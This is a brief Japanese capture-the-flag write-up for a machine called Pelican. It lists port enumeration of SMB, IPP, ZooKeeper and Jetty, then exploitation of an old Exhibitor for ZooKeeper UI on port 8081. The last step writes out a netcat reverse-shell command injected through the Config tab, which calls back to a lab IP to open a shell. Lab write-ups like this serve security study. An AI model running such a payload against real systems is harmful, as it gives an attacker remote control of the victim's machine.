# Pelican

## 手順
1. いつものrustscan。怪しいポートが結構ある。
2. まずSMBの139がanonymousログオンいけるので見るがめぼしい情報はなく。smbmap -Hを匿名で行うもどこにもアクセスはできず。
3. smbにもprintみたいなフォルダがあり、631ポートがippとかいうプリンター関連のポートらしく。怪しいなと思い。しかしぱっと調べた感じ特に何もなく。
4. 2181にzookeeper、8080はJetty1.0がありどっちも怪しいなと。しかしぱっと調べた感じpublic exploitが見当たらず。
5. 8081ポートを見るとExhibitor for ZooKeeperというUIが。v1.0とあり古そう。調べるとconfirmedされていないものの、Public Exploitが見つかり。
6. Configタブから簡単な$(/bin/nc -e /bin/sh 192.168.45.240 4444 &)というコマンドを入力しておいてCommitするとRCEに成功してシェルを取れた。